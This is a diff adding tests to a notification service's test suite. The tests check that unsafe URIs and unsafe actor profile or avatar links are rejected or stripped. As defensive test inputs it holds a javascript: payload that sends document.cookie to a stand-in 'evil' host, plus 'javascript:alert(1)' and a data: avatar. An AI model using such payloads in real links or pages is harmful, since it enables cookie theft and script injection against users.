@@ -335,6 +335,154 @@ it('a mixed route delivers to all of one channel AND a specific instance of anot
   expect(await res.json()).toMatchObject({ delivered: 3 });
 });
 
+it('rejects a javascript: uri with 400 and records nothing in the inbox', async () => {
+  const sender = await makeIdentity('did:plc:sendjsuri');
+  mockPlc(sender);
+  const recip: Did = 'did:plc:jsurirecipient';
+  await q.ensureUser(env.DB, recip, Date.now());
+  await q.upsertGrant(env.DB, {
+    recipientDid: recip,
+    senderDid: sender.did,
+    grantedAt: Date.now(),
+    title: null,
+    description: null,
+    iconUrl: null
+  });
+  const jwt = await makeJwt(sender, { lxm: SEND });
+
+  const res = await call(
+    xrpcPost(SEND, jwt, {
+      recipient: recip,
+      title: 'Hi',
+      body: 'B',
+      uri: 'javascript:fetch("https://evil/"+document.cookie)'
+    })
+  );
+
+  expect(res.status).toBe(400);
+  // A rejected request has no side effects (no inbox row).
+  expect(await q.listNotificationsForRecipient(env.DB, recip, 50)).toHaveLength(0);
+});
+
+it('rejects a non-http(s) scheme (tg:) with 400', async () => {
+  const sender = await makeIdentity('did:plc:sendtguri');
+  mockPlc(sender);
+  await q.upsertGrant(env.DB, {
+    recipientDid: RECIPIENT,
+    senderDid: sender.did,
+    grantedAt: Date.now(),
+    title: null,
+    description: null,
+    iconUrl: null
+  });
+  const jwt = await makeJwt(sender, { lxm: SEND });
+
+  const res = await call(
+    xrpcPost(SEND, jwt, {
+      recipient: RECIPIENT,
+      title: 'Hi',
+      body: 'B',
+      uri: 'tg://resolve?domain=evil'
+    })
+  );
+
+  expect(res.status).toBe(400);
+});
+
+it('rejects an over-long uri with 400', async () => {
+  const sender = await makeIdentity('did:plc:sendlonguri');
+  mockPlc(sender);
+  await q.upsertGrant(env.DB, {
+    recipientDid: RECIPIENT,
+    senderDid: sender.did,
+    grantedAt: Date.now(),
+    title: null,
+    description: null,
+    iconUrl: null
+  });
+  const jwt = await makeJwt(sender, { lxm: SEND });
+  const longUri = 'https://example.com/' + 'a'.repeat(2050);
+
+  const res = await call(
+    xrpcPost(SEND, jwt, { recipient: RECIPIENT, title: 'Hi', body: 'B', uri: longUri })
+  );
+
+  expect(res.status).toBe(400);
+});
+
+it('accepts a valid https uri and stores it unchanged in the inbox', async () => {
+  const sender = await makeIdentity('did:plc:sendvaliduri');
+  mockPlc(sender);
+  const recip: Did = 'did:plc:validurirecipient';
+  await q.ensureUser(env.DB, recip, Date.now());
+  await q.upsertGrant(env.DB, {
+    recipientDid: recip,
+    senderDid: sender.did,
+    grantedAt: Date.now(),
+    title: null,
+    description: null,
+    iconUrl: null
+  });
+  await q.setDefaultRoute(env.DB, recip, 'inbox');
+  const jwt = await makeJwt(sender, { lxm: SEND });
+  const uri = 'https://example.com/post/123?ref=abc';
+
+  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B', uri }));
+
+  expect(res.status).toBe(200);
+  const rows = await q.listNotificationsForRecipient(env.DB, recip, 50);
+  expect(rows[0]?.uri).toBe(uri);
+});
+
+it('sanitizes actor avatar/profile URLs (drops non-http(s))', async () => {
+  const sender = await makeIdentity('did:plc:sendactorurls');
+  mockPlc(sender);
+  const recip: Did = 'did:plc:actorurlsrecipient';
+  await q.ensureUser(env.DB, recip, Date.now());
+  await q.upsertGrant(env.DB, {
+    recipientDid: recip,
+    senderDid: sender.did,
+    grantedAt: Date.now(),
+    title: null,
+    description: null,
+    iconUrl: null
+  });
+  await q.setDefaultRoute(env.DB, recip, 'inbox');
+  const jwt = await makeJwt(sender, { lxm: SEND });
+
+  const res = await call(
+    xrpcPost(SEND, jwt, {
+      recipient: recip,
+      title: 'Hi',
+      body: 'B',
+      actors: [
+        {
+          did: 'did:plc:gooda',
+          handle: 'good.test',
+          avatarImage: 'https://cdn.test/a.png',
+          url: 'https://bsky.app/profile/good.test'
+        },
+        // A malicious sender: a `javascript:` profile link + a `data:` avatar.
+        { did: 'did:plc:bada', url: 'javascript:alert(1)', avatarImage: 'data:image/png;base64,AA' }
+      ]
+    })
+  );
+
+  expect(res.status).toBe(200);
+  const rows = await q.listNotificationsForRecipient(env.DB, recip, 50);
+  const actors = JSON.parse(rows[0]?.actors ?? '[]') as unknown;
+  expect(actors).toEqual([
+    {
+      did: 'did:plc:gooda',
+      handle: 'good.test',
+      avatarImage: 'https://cdn.test/a.png',
+      url: 'https://bsky.app/profile/good.test'
+    },
+    // The unsafe url + avatarImage were dropped; the actor itself is kept.
+    { did: 'did:plc:bada' }
+  ]);
+});
+
 it('an instance-scoped route delivers to just that one device', async () => {
   const sender = await makeIdentity('did:plc:sendoneinstance');
   mockPlc(sender);
